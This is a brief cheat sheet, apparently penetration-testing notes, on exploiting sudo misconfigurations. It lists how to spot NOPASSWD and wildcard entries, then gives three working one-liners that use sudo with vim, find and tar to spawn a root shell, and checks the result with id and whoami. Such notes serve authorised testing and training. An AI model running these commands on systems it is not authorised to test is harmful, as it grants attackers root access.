# Sudo Misconfiguration

## Detection

sudo -l

Look for:

- NOPASSWD entries
- wildcard commands
- dangerous binaries

## Exploitation Examples

sudo vim -c ':!/bin/sh'

sudo find . -exec /bin/sh \; -quit

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

## Verification

id
whoami
